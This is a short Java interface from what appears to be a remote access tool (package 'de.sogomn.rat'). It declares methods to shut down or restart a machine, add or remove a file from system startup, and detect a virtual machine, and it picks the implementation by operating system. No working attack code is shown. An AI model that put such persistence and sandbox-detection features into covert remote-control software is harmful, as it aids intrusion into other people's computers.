/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.service;

import java.nio.file.Path;

public interface IOperatingSystemService {
	
	void shutDown();
	
	void restart();
	
	void addToStartup(final Path file);
	
	void removeFromStartup(final String name);
	
	boolean isVm();
	
	public static IOperatingSystemService getInstance() {
		final String os = System.getProperty("os.name").toUpperCase();
		
		if (os.contains("WINDOWS")) {
			return new WindowsService();
		} else if (os.contains("MAC")) {
			return new MacService();
		} else if (os.contains("NIX") || os.contains("NUX") || os.contains("AIX")) {
			return new LinuxService();
		}
		
		return null;
	}
	
}
